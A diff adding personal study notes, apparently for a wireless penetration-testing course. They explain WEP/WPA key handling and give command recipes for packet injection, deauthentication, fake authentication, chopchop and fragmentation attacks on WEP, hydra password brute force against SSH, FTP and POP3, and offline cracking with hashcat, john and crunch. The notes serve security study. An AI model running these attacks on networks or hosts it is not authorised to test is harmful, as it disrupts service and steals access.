+# check if we can inject in a specific AP
+sudo aireplay-ng -e &lt;ap_name&gt; -a &lt;MAC&gt; wlan0mon
+
+# Same as above, but without expecting to receive probes
+sudo aireplay-ng -e &lt;ap_name&gt; -a &lt;MAC&gt; -D wlan0mon
+
+# if we have two wifi cards, wlan0mon and wlan1mon, card-to-card test, to make sure they can inject. if it says (5/7 error, still can be used to attack an AP)
+sudo aireplay-ng -9 -i wlan1mon wlan0mon
+
+</code></pre>
+<p><font color="red">Sometimes aireplay-ng says that he can't find the BSSID, that's because it's not using the appropriate channel. For that, run airodump-ng in the appropriate channel before aireplay-ng, or set the channel with
+"iw dev wlan0 set channel 13"</font></p>
+<h4 id="airdecap-ng"><a class="header" href="#airdecap-ng">airdecap-ng</a></h4>
+<pre><code class="language-bash"># Keep the packets targeted to a specific &lt;BSSID&gt; and remove the rest from a cap file (creates a new file)
+airdecap-ng -b &lt;MAC&gt; file.pcap
+
+# decrypt saved traffic with a passphrase (check that the passphrase works, we may capture failed logins)
+airdecap-ng -b &lt;bssid&gt; -e &lt;essid&gt; -p &lt;pass&gt; file.pcap
+</code></pre>
+<h4 id="aircrack-ng"><a class="header" href="#aircrack-ng">aircrack-ng</a></h4>
+<pre><code class="language-bash">#benchmark (dice k/s, que es el numero de palabras por segundo que puede crackear)
+aircrack-ng -S  
+
+# DON'T use a dictionary for WEP files!!!!
+aircrack-ng wep.cap
+
+# crack a handshake saved in a cap file:
+aircrack-ng -w &lt;path to wordlist&gt; -e &lt;ESSID&gt; -b &lt;ap bssid&gt; file.pcap
+aircrack-ng -w /usr/share/john/password.lst -e &lt;ESSID&gt; -b &lt;ap bssid&gt; file.cap
+
+#crack using a db created with airolib (precomputed PMKs)
+aircrack-ng -r wifu.sqlite wpa1-01.cap
+</code></pre>
+<p><font color=red>If in a capture file an AP has hidden name but we find it in another way, we need to pass both arguments to aircrack-ng, -b and -e, so that it can match a BSSID to an ESSID</font></p>
+<h4 id="airgraph-ng"><a class="header" href="#airgraph-ng">airgraph-ng</a></h4>
+<p>Creates graphs of APs and stations. Colors:</p>
+<ul>
+<li>green -&gt; WPA</li>
+<li>yellow -&gt; WEP</li>
+<li>red -&gt; open</li>
+<li>black -&gt; desconocido el cifrado</li>
+</ul>
+<pre><code class="language-bash">#CAPR: client to access point relationship. Provide a csv captured by airodump
+airgraph-ng -i dump.csv -o file.png -g CAPR
+
+# CPG: client probe graph -&gt; shows relations (connections) from clients to APs
+airgraph-ng -i dump.csv -o file.png -g CPG
+</code></pre>
+<h4 id="airolib-ng"><a class="header" href="#airolib-ng">airolib-ng</a></h4>
+<p>manages password lists in SQLite (calculating pairwise master key (PMK) is slow, but it is constant for an AP. precomputing it saves time later).</p>
+<pre><code class="language-bash"># create a text file containing the ESSID of the target AP
+echo wifu &gt; essid.txt
+
+# import the text file into an airolib-ng database
+airolib-ng wifu.sqlite --import essid essid.txt
+
+# info about database (ESSIDs and stored passwords)
+airolib-ng wifu.sqlite --stats
+
+# import a dictionary of passwords (ignores those shorter than 8 chars and larger than 63 chars, since they are not valid WPA passphrases)
+airolib-ng wifu.sqlite --import passwd /usr/share/john/password.lst
+
+# calculate the PMK corresponding to each inported password
+airolib-ng wifu.sqlite --batch
+
+#crack using a db
+aircrack-ng -r wifu.sqlite wpa1-01.cap
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-3---protocol"><a class="header" href="#chapter-3---protocol">Chapter 3 - Protocol</a></h1>
+<h3 id="wifi-bands-1"><a class="header" href="#wifi-bands-1">wifi bands</a></h3>
+<ul>
+<li>a, only 5 GHz -&gt; seems like scanning with airodump on band a can pick up 2.4 GHz APs too</li>
+<li>b, g, only 2.4 GHz</li>
+<li>n, both 5 and 2.4 GHz</li>
+<li>ac, freqs lower than 6 GHz</li>
+</ul>
+<h3 id="wep-wireless-equivalent-privacy"><a class="header" href="#wep-wireless-equivalent-privacy">WEP (wireless equivalent privacy)</a></h3>
+<p><strong>SKA</strong> = shared key authentication (ver si sale en PA al intentar auth wep) [[4 - WEP#WEP SKA]]
+<strong>ICV</strong> = integrity value check (CRC)
+<strong>WEP cloaking</strong> = the AP injects fake wep packets to difficult cracking
+<strong>Keystream</strong> (created by RC4 from IV + key)</p>
+<h3 id="wpawpa2"><a class="header" href="#wpawpa2">WPA/WPA2</a></h3>
+<p><strong>PSK</strong> = pre shared key (what the client enters to connect)
+<strong>PTK</strong> = pairwise transient key
+<strong>PMK</strong> = pairwise master key (dynamic key generated in handshake using <strong>PBKDF2</strong> (password based key derivation function 2))
+-  If there is a <strong>PSK</strong>, the <strong>PMK</strong> is the <strong>PSK</strong>
+-  A PSK is either a 256-bit key or derived from a passphrase
+-  If a passphrase is used, it generates the <strong>PSK</strong> using the AP SSID as the salt: PSK = PBKDF2(HMAC−SHA1, Passphrase, SSID, 4096, 256)
+-  If there is no PSK, the PMK is derived using 802.1x EAP exchange, usually RADIUS
+<strong>GTK</strong> = group transient key (used when messages like ARP are sent to many people, everyone needs to decrypt it equally)
+<strong>WPS</strong> = wifi protected setup (Tools: wash, reaver, bully)
+<strong>PBC</strong> = push button configuration
+Encryption mechanisms
+<strong>TKIP</strong> (based on WEP, which uses RC4, xor, etc)
+<strong>CCMP</strong> (based on AES)</p>
+<ul>
+<li>
+<p>The 4-way handshake does the following:</p>
+<ul>
+<li>Confirm the client’s knowledge of the PMK</li>
+<li>Confirm the AP's knowledge of the PMK</li>
+<li>Derive a new and unique PTK</li>
+<li>Install encryption and integrity keys</li>
+<li>Encrypt transport of the AP generated GTK to the client</li>
+<li>Confirm cipher suite selection</li>
+</ul>
+</li>
+<li>
+<p>The PMK, nonces, and handshake MAC addresses are run through a PRF based on HMAC-SHA1 to derive the 512-bit PTK. During the handshake the AP also transmits the 256-bit GTK, or Group Temporal Key, to the client. The PTK and GTK are split into several components, some of which are used as AES keys for different types of network traffic, and some of which are integrity keys.</p>
+<ul>
+<li>KCK = PTK bits 0-127, the key confirmation key</li>
+<li>KEK = PTK bits 128-255, the key encryption key</li>
+<li>TEK = PTK bits 256-383, the temporal encryption key for unicast traffic</li>
+<li>TMK = PTK bits 384-511, the temporal MIC keys for TKIP</li>
+<li>GEK = GTK bits 0-127, the group encryption key for multicast traffic</li>
+<li>GIK = GTK bits 128-255, the group integrity key for TKIP</li>
+</ul>
+</li>
+</ul>
+<h3 id="wpa-enterprise-1"><a class="header" href="#wpa-enterprise-1">WPA enterprise</a></h3>
+<p><strong>EAP</strong> = extended authentication protocol -&gt; authenticate with RADIUS server (in airodump <font color=red>AUTH=MGT</font>). Requires certificates on the server at least (deprecated EAP methods didn't require them)</p>
+<p>EAP Transport Layer Security (<strong>EAP-TLS</strong>) is one of the most secure authentication methods, as it uses certificates on the server side and client side, instead of login and passwords, so the client and server mutually authenticate each other.
+<strong>EAPoL</strong>=extended authentication protocol over lan
+Identity = username
+Authentication methods:
+- EAP-MD5 (vulnerable to brute force, tool: eapmd5pass)
+- EAP-PAP
+- EAP-GTC
+- EAP-CHAP
+- EAP-MSCHAPv2
+Encapsulations
+- <strong>PEAP</strong> - Protected Extensible Authentication Protocol(tunnel between client and RADIUS server, the AP sees nothing). creates a TLS tunnel before credentials are exchanged. Although different methods can be used within PEAP, MS-CHAPv2 is a commonly used inner method. PEAP and EAP-TLS mostly differ on how the data is exchanged inside the TLS tunnel.
+- <strong>EAP-TTLS</strong> - EAP Tunneled Transport Layer Security. also uses TLS. As opposed to EAP-TLS, it does not necessarily need client certificates. It creates a tunnel and then exchanges the credentials using one of the few possible different inner methods (also called <strong>phase 2</strong>), such as Challenge-Handshake Authentication Protocol (CHAP), Authentication Protocol (PAP), Microsoft CHAP (MS-CHAP), or MS-CHAPv2.</p>
+<h3 id="owe-opportunistic-wireless-encryption"><a class="header" href="#owe-opportunistic-wireless-encryption">OWE (opportunistic wireless encryption)</a></h3>
+<p>encrypt traffic during a connection, to prevent eavesdropping  of credential exchange</p>
+<h3 id="sae-simultaneous-authentication-of-equals"><a class="header" href="#sae-simultaneous-authentication-of-equals">SAE (simultaneous authentication of equals)</a></h3>
+<p>enhanced version of diffie helmann where no pre shared key is necessary</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-4---cracking"><a class="header" href="#chapter-4---cracking">Chapter 4 - Cracking</a></h1>
+<h2 id="default-credentials"><a class="header" href="#default-credentials">Default credentials</a></h2>
+<p>First of all, if we know the AP model, check for default credentials. The first half of the BSSID can help:
+https://www.wireshark.org/tools/oui-lookup.html</p>
+<h2 id="online-cracking"><a class="header" href="#online-cracking">Online cracking</a></h2>
+<pre><code class="language-bash"># hydra ssh
+hydra -t 4 -l root -P /root/wordlists/100-common-passwords.txt ssh://192.105.16.4
+
+# hydra ftp
+hydra -t 3 -l root -P /root/wordlists/100-common-passwords.txt ftp://192.105.16.4
+
+# POP3
+hydra -L login.txt -P passwords.txt -V 192.168.50.128 -s 110 -t 2 pop3
+</code></pre>
+<h2 id="offline-cracking"><a class="header" href="#offline-cracking">Offline Cracking</a></h2>
+<h3 id="hashcat"><a class="header" href="#hashcat">Hashcat</a></h3>
+<ul>
+<li><font color="red">The hashcat module to crack WPA/WPA2 is 2500</font></li>
+<li><font color="red">We can pause (<code>p</code>) and resume (<code>r</code>) the hashcat execution</font></li>
+</ul>
+<pre><code class="language-bash"># info about cracking hardware
+hashcat -I 
+
+# benchmark of all hash types (very slow)
+hashcat -b
+
+# benchmark a single hash type
+hashcat -b -m 2500
+
+# extract hashes from a cap file
+cap2hccapx.bin file.cap output.hccapx
+
+# crack
+hashcat -m 2500 out.hccapx &gt;wordlist&gt;
+
+# with -d we can choose the cracking device of the listed ones
+hashcat64 -m 2500 -d 1 &lt;pcap file&gt; &lt;wordlist&gt;
+
+# with --pot-file we can indicate another path to save the pot file
+
+# install hashcat utilities (found in /usr/lib/hashcat-utils)
+sudo apt install hashcat-utils
+
+# convert PCAP file to HCCAPx file with a hashcat util
+/usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx
+
+</code></pre>
+<h4 id="hashcat-modules"><a class="header" href="#hashcat-modules">Hashcat modules</a></h4>
+<div class="table-wrapper"><table><thead><tr><th>type</th><th>module</th><th>example</th></tr></thead><tbody>
+<tr><td>WPA-EAPOL-PBKDF2</td><td>-m 2500</td><td></td></tr>
+<tr><td>WPA-EAPOL-PMK</td><td>-m 2501</td><td></td></tr>
+<tr><td>WPA-PMKID-PBKDF2</td><td>-m 16800</td><td></td></tr>
+<tr><td>WPA-PMKID-PMK </td><td>-m 16801</td><td>2582a8281bf9d4308d6f5731d0e61c61<em>4604ba734d4e</em>89acf0e761f4</td></tr>
+<tr><td>TTLS-CHAP</td><td>-m 4800</td><td>ce8d3c0b4c5c9369ce426ba7d36d164e:38ddb29b0fea9243afb6fb9d6bb95bfb:2a</td></tr>
+<tr><td>TTLS-MSCHAPv2</td><td>-m 5500</td><td>user1::::f4ed9fe147deaed3bfb1a1744ce1908788c66d281b134a11:d98dd4b772ee831c</td></tr>
+</tbody></table>
+</div>
+<h3 id="password-mutation"><a class="header" href="#password-mutation">Password mutation</a></h3>
+<h4 id="john"><a class="header" href="#john">John</a></h4>
+<p>The rules to mutate passwords are in /etc/john/john.conf</p>
+<ul>
+<li>Rule to add 2 and 3 numbers at the end of the password:</li>
+</ul>
+<pre><code>$[0-9]$[0-9]
+$[0-9]$[0-9]$[0-9]
+</code></pre>
+<p>Use --rules with john to apply rules</p>
+<pre><code class="language-bash"># See the wordlist in screen
+john --wordlist=&lt;wordlist file&gt; --stdout
+
+# We can see the variations that will be applied and see if password123 is generated
+sudo john --wordlist=&lt;path to wordlist&gt; --rules --stdout |grep -i password123
+
+# With --session the session is saved and can be restored the next time it is resumed from the last password tried 
+john --wordlist=&lt;wordlist file&gt; --stdout --session=&lt;session name&gt; | aircrack-ng -w - -b &lt;AP BSSID&gt; &lt;file.cap&gt;
+
+# We can stop it with "q" or "ctrl-c", and continue later from that point
+john --restore=&lt;session name&gt; | aircrack-ng -w - -b &lt;AP BSSID&gt; &lt;file.cap&gt;
+
+# We can pipe mutations to aircrack without saving to disk with "-w -" :
+sudo john --wordlist=&lt;wordlist&gt; --rules --stdout | aircrack-ng -e wifu -w - &lt;file.pcap&gt;
+
+# We can save and restore sessions also with wordlists generated on the fly with crunch 
+crunch 8 8 | john --stdin --session=&lt;session name&gt; --stdout | aircrack-ng -w - -b &lt;AP BSSID&gt; &lt;file.cap&gt;
+
+# and later restore with
+crunch 8 8 | john --restore=&lt;session name&gt; | aircrack-ng -w - -b &lt;AP BSSID&gt; &lt;file.cap&gt;
+</code></pre>
+<h4 id="crunch"><a class="header" href="#crunch">Crunch</a></h4>
+<p>Generate new passwords, we need to say the minimum and maximum length (WPA requires passphrases between 8 and 63 chars). Crunch also allows us to specify a pattern with the <em>-t</em> option with or without a character set. Different symbols in the pattern define the type of character to use.</p>
+<ul>
+<li><em>@</em> represents lowercase characters or characters from a defined set</li>
+<li><em>,</em> represents uppercase characters</li>
+<li><em>%</em> represent numbers</li>
+<li><em>^</em> represents symbols</li>
+</ul>
+<pre><code class="language-bash"># Create all combinations of words from 8 to 9 characters (a lot of output, not practical)
+crunch 8 9
+
+# Crate all combinations of words from 8 to 9 characters using only the characters: a,b,c,1,2 and 3:
+crunch 8 9 abc123
+
+# Create combinations of 11 chars formed by the word "Password" and 3 numbers
+crunch 11 11 Password%%%
+
+# equivalent:
+crunch 11 11 0123456789 -t password@@@
+
+# generate unique combinations from a set (in this case the min and max lengths are ignored but we need to provide them so that the program doesn't fail)
+crunch 1 1 -p abcdefg1234
+
+# Generate unique words from some words (it combines them)
+crunch 1 1 -p january february march
+
+# Generate patterns with the words we say (they are replaced in the "d")
+crunch 5 5 -t ddd%% -p january february march
+
+# If instead of the % we use @ crunch adds lowercase letters instead of numbers
+
+# it replaces the letters "aADE" in the @@ and the words in the "d" letters
+crunch 5 5 aADE -t ddd@@ -p january february march
+
+# pipe output from crunch to aircrack:
+crunch 5 5 aADE -t ddd@@ -p january february march | aircrack-ng -e wifu file.pcap -w -
+
+</code></pre>
+<h4 id="mangler"><a class="header" href="#mangler">Mangler</a></h4>
+<p>Ruby script to mutate passwords
+--allow-duplicates is usually worth it because of the time we save in not checking if there are duplicates</p>
+<pre><code class="language-bash"># Mutate words of a file
+rsmangler --file file.txt
+cat file.txt | rsmangler --file -
+
+# Limit the size of the generated words
+rsmangler --file wordlist.txt --min 12 --max 13
+
+# Pipe to aircrack (don't use --output, that is only to save to disk)
+rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e wifu file.pcap -w -
+</code></pre>
+<p>A set of three words generates about 6,000 passwords, four words generates about 23,000 passwords, and five words generates about 125,000 passwords. We need to take care to ensure the wordlist we begin with is a reasonable size.</p>
+<h3 id="cowpatty"><a class="header" href="#cowpatty">coWPAtty</a></h3>
+<p>Tool that recovers WPA pre-shared keys using both dictionary and rainbow table attacks. Although coWPAtty is not being developed anymore, it is still useful, especially when using its rainbow table attack method. Install it with <code>sudo apt install cowpatty</code></p>
+<pre><code class="language-bash">#Generate rainbow tables
+genpmk -f &lt;password file&gt; -d hashes -s test
+
+cowpatty -r wpa-01.pcap -d hashes -s test 
+</code></pre>
+<h3 id="extra-wep"><a class="header" href="#extra-wep">extra WEP</a></h3>
+<p>Automatic tool. It sends packets to the WEP network that we are trying to attack. It may be necessary to run this command several times, sometimes it fails.</p>
+<pre><code class="language-bash">besside-ng wlan0 -c 6 -b &lt;BSSID&gt;  
+</code></pre>
+<h3 id="wordlists"><a class="header" href="#wordlists">wordlists</a></h3>
+<p>ftp://ftp.openwall.com/pub/wordlists/
+http://www.openwall.com/mirrors/
+https://github.com/danielmiessler/SecLists
+http://www.outpost9.com/files/WordLists.html
+http://www.vulnerabilityassessment.co.uk/passwords.htm
+http://packetstormsecurity.org/Crackers/wordlists/
+http://www.ai.uga.edu/ftplib/natural-language/moby/
+http://www.cotse.com/tools/wordlists1.htm
+http://www.cotse.com/tools/wordlists2.htm
+http://wordlist.sourceforge.net/</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-5---wep"><a class="header" href="#chapter-5---wep">Chapter 5 - WEP</a></h1>
+<h2 id="quick-notes-1"><a class="header" href="#quick-notes-1">Quick Notes</a></h2>
+<pre><code>
+## Fake Authentication Attack
+   
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                         ## setting the wireless card (wlan0) to monitor mode
+   macchanger --show &lt;interface&gt;                                                    ## learning the MAC address of the mon0 (monitor mode) network interface
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;       ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                ## performing a fake authentication attack against AP
+   
+   
+## Deauthentication Attack
+
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;       ## listening to the target AP on the specified channel
+   aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                         ## performing a deauthentication attack against AP
+
+
+## ARP Request Replay Attack
+
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;       ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                ## performing a fake authentication attack against AP
+   aireplay-ng -3 -b &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                             ## performing a ARP Request Replay attack against AP
+   aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                         ## performing a deauthentication attack against AP
+   aircrack-ng &lt;capture_file&gt;                                                       ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
+ 
+
+## Interactive Packet Replay Attack
+
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;       ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                ## performing a fake authentication attack against AP
+   aireplay-ng -2 -b &lt;AP_MAC&gt; -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 &lt;interface&gt;     ## performing a interactive packet replay attack against AP
+   aircrack-ng -z &lt;capture_file&gt;                                                    ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
+
+
+## Fragmentation Attack
+
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;       ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;                ## performing a fake authentication attack against AP
+   aireplay-ng -5 -b &lt;AP_MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;                             ## performing a fragmentation attack against AP
+   packetforge-ng -0 -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; -l &lt;Source_IP&gt; -k &lt;Dest_IP&gt; -y &lt;XOR_file&gt; -w &lt;output_file&gt;     ## creating an ARP request packet using packetforge-ng
+   tcpdump -n -vvv -e -s0 -r &lt;output_file&gt;                                          ## check the contents of the created package
+   aireplay-ng -2 -r &lt;output_file&gt; &lt;interface&gt;                                      ## injecting the generated packet into the network (If the correct pack is injected, the IV amount will increase rapidly.)
+   aircrack-ng &lt;capture_file&gt;                                                       ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
+   
+
+## Korek ChopChop Attack
+
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;       ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                ## performing a fake authentication attack against AP
+   aireplay-ng -4 -b &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                             ## performing a korek chopchop attack against AP
+   packetforge-ng -0 -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; -l &lt;Source_IP&gt; -k &lt;Dest_IP&gt; -y &lt;XOR_file&gt; -w &lt;output_file&gt;     ## creating an ARP request packet using packetforge-ng
+   tcpdump -n -vvv -e -s0 -r &lt;output_file&gt;                                          ## check the contents of the created package
+   aireplay-ng -2 -r &lt;output_file&gt; &lt;interface&gt;                                      ## injecting the generated packet into the network (If the correct pack is injected, the IV amount will increase rapidly.)
+   aircrack-ng &lt;capture_file&gt;                                                       ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
+
+
+## Bypassing WEP Shared Key Authentication
+   
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                                  ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;                ## listening to the target AP on the specified channel
+   aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                                  ## performing a deauthentication attack against AP to capture the PRGA XOR keystream
+   aireplay-ng -1 0 -e &lt;ESSID&gt; -y &lt;keystream file&gt; -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;     ## performing a fake shared key authentication using XOR key flow
+   aireplay-ng -3 -b &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                                      ## performing a ARP Request Replay attack against AP
+   aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                                  ## performing a deauthentication attack against AP
+   aircrack-ng &lt;capture_file&gt;                                                                ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
+   
+   
+   
+   
+
+</code></pre>
+<p><img src="WEPDiagram.png" alt="WEPDiagram" /></p>
+<p>CRC-32 is a digest, just like MD5</p>
+<p>An attacker can sniff packets, where the IV (24 bit) is in plain text. since 24 bit is not much, capturing enough packets, statistical attacks can be run. RC4 generates the same keystring for a same IV+key. #Data in airodump shows how many useful packets have been captured. When enough are present we can crack it with:
+<code>aircrack-ng archivo.cap</code></p>
+<p>Sometimes aircrack doesn't return the ascii version of the key but we can connect to the network with the hex (without the ":" ).</p>
+<p>If not many clients are connected we can force the AP to send us traffic. We first need to associate with it (otherwise it ignores our requests), then we can send packets and capture the IVs in the packets it returns to us.</p>
+<p>For this, keep saving packets:
+<code>sudo airodump-ng --bssid &lt;bssid&gt; --channel &lt;channel&gt; --write out wlan0mon</code></p>
+<p>and do a fake auth (the 0 indicates that the attack is done once):
+<code>sudo aireplay-ng --fakeauth 0 -a &lt;AP bssid&gt; -h &lt;la MAC de wlan0mon&gt; wlan0mon</code></p>
+<p>In monitor mode, with ifconfig we see <code>unspec</code> instead of  <code>ether</code> and the MAC looks longer, we need only the first 6 bytes:
+<font color=red>and for aireplay commands replace - by : </font></p>
+<p>At this point we are only associated to the AP, not connected to it. There are several methods to generate traffic:</p>
+<h4 id="crafted-arp-packets"><a class="header" href="#crafted-arp-packets">Crafted ARP packets</a></h4>
+<p>Wait till there is an ARP packet (sent by the clients already connected to the network). They will be encrypted but because of their length we know they can be ARP. We just relay them to the AP. The AP will respond to us with another packet with a new IV. We do this until we have enough IVs.
+To do this (just befor this command run the --fakeauth just in case)
+It is necessary to use a target client MAC with -h, the MAC of a client that is already connected to the network and sends valid IVs
+<code>sudo aireplay-ng --arpreplay -b &lt;AP bssid&gt; -h &lt;target client MAC&gt; wlan0mon</code></p>
+<p><font color=red> The -a used in other commands is replaced by -b for the BSSID and the --arpreplay doesn't have any number afterward</font>
+This captures packets until one of them is an ARP request, and then starts to generate traffic. Watch with airodump who many useful packets we have in <code>#Data</code>.</p>
+<p><font color=red>to capture useful ARP packets we either need to be associated with the AP (fakeauth) or use with aireplay-ng arpreplay the MAC of an associated client</font></p>
+<p>Depending on the key length (64 or 128) bit it takes more IVs to crack the key</p>
+<h4 id="stealthy-sniffing"><a class="header" href="#stealthy-sniffing">Stealthy sniffing</a></h4>
+<p>Just waiting for clients to send a lot of IVs to the AP can take a lot of time but it's stealty</p>
+<h4 id="chop-chop-attack"><a class="header" href="#chop-chop-attack">Chop chop attack</a></h4>
+<p>Instead of replaying an ARP packet we determine the keystream of a packet, we craft a new packet with the keystream and inject it to the AP. The AP will respond with a new IV that we will replay, etc. Can be used when no clients are connected to the AP</p>
+<p><font color=red>The --fakeauth attack is only used against OPEN and WEP networks, it doesn't work against WPA/WPA2. Fake auth doesn't generate ARP packets. The lack of association with the access point is the biggest reason why injection fails, so we need to do fakeauth before trying to inject packets to WEP networks (ARP replay, chopchop, fragmentation attack).</font>
+Sometimes you periodically get disassociation events. Some access points require to reassociate every 30 seconds, otherwise the fake client is considered disconnected. In this case, setup the periodic re-association delay:</p>
+<pre><code class="language-bash">aireplay-ng -1 30 -e 'the ssid' -a 00:13:10:30:24:9C -h 00:11:22:33:44:55 ath0
+</code></pre>
+<p>If fake authentication is never successful (aireplay-ng keeps sending authentication requests) then MAC address filtering may be in place</p>
+<p>more info and troubleshooting in: https://www.aircrack-ng.org/doku.php?id=fake_authentication</p>
+<pre><code class="language-bash"># We first start airodump to capture packets and save them to a file
+sudo airodump-ng --bssid &lt;bssid&gt; --channel &lt;channel&gt; --write out wlan0mon
+
+# Then we do fake auth with aireplay to associate to the AP (run just before the chop chop attack). We can get our MAC with ifconfig wlan0
+sudo aireplay-ng --fakeauth 0 -a &lt;AP bssid&gt; -h &lt;our wlan0mon MAC that we want to associate&gt; wlan0mon
+
+# chop chop attack (waits for beacons from AP to try to determine keystream from them)
+sudo aireplay-ng --chopchop -b &lt;AP bssid&gt; -h &lt;our wlan0mon MAC&gt; wlan0mon
+
+# When it finds an ARP packet it asks if we want to use it. say "y". After a while it saves the keystream in a xor file. We can do ctrl-C to not wait much, but the saved keystream may fail. If so, keep the chop chop working for longer.
+
+# After that, forge an ARP packet (-0 option)
+packetforge-ng -0 -a &lt;bssid&gt; -h &lt;our wlan0mon MAC address&gt; -k 255.255.255.255 -l 255.255.255.255 -y &lt;file.xor&gt; -w &lt;forged packet name&gt;
+# -k is destination IP (use 255.255.255.255)
+# -l is source IP (use 255.255.255.255)
+# &lt;forged packet name&gt; can be anything, it's the name of the forged packet
+
+# having done --deauth again, use the forged packet:
+sudo aireplay-ng -2 -r &lt;forged packet name&gt; wlan0mon
+# -2 is for replaying
+# it asks again if we want to use the packet. say "y", this starts to generate traffic that airodump caputres
+</code></pre>
+<h4 id="fragmentation-attack"><a class="header" href="#fragmentation-attack">fragmentation attack</a></h4>
+<p>Similar to chop chop but we need to obtain 1500 bytes from the pseudo random generator algorithm (PRGA). With this attack another packet is forged, but it's faster than chop chop, although we need to be physically close to the AP so that it works better.</p>
+<pre><code class="language-bash"># Start saving packets
+sudo airodump-ng --bssid &lt;bssid&gt; --channel &lt;channel&gt; --write out wlan0mon
+
+# fake auth (the 0 instructs to do the attack once)
+sudo aireplay-ng --fakeauth 0 -a &lt;AP bssid&gt; -h &lt;our wlan0mon MAC&gt; wlan0mon
+
+# Obtain PRGA
+aireplay-ng --fragment -b &lt;bssid&gt; -h &lt;our wlan0mon MAC&gt; wlan0mon
+
+# Say "y" when asked. It may fail several times and ask us if we want to use another. say "y" always. When one of the packets is useful it lets us know and saves the keystream in a .xor file
+
+# forge a new packet (with -0 it creates an ARP packet)
+packetforge-ng -0 -a &lt;bssid&gt; -h &lt;nuestra mac de wlan0mon&gt; -k 255.255.255.255 -l 255.255.255.255 -y &lt;xor file&gt; -w &lt;output&gt;
+
+# inject the forged packet (remember to do fake auth just before this)
+sudo aireplay-ng -2 -r &lt;forged packet name&gt; wlan0mon
+</code></pre>
+<h4 id="wep-ska"><a class="header" href="#wep-ska">WEP SKA</a></h4>
+<p>Normally when we do fake auth with aireplay-ng to a WEP network we can see it becomes OPN, but some routers allow to configure Shared Key Authentication (SKA), which prevents that no one without that key can associate to the AP (unlike in OPEN networks, where anyone can associate). In networks with SKA set up we will see SKA after doing fake auth.</p>
+<p>It is possible to deauthenticate a connected client, and capture the SKA when he reconnects. With this key we can associate to the AP and try the previous attacks to recover the WEP key.</p>
+<p>We can also inject an ARP packet using the MAC address of the client which is already connected to the AP. With this we can generate traffic to recover IVs and still crack the WEP password, despite not having the SKA.</p>
+<pre><code class="language-bash">sudo aireplay-ng --arpreplay -b &lt;AP bssid&gt; -h &lt;MAC of a connected client&gt; wlan0mon
+</code></pre>
+<p>The 802.11w standard protects against deauth attacks, buth must be supported by both the client and the AP</p>
+<p>When we have cracked a WEP or WPA key we can decrypt captured traffic in wireshark:</p>
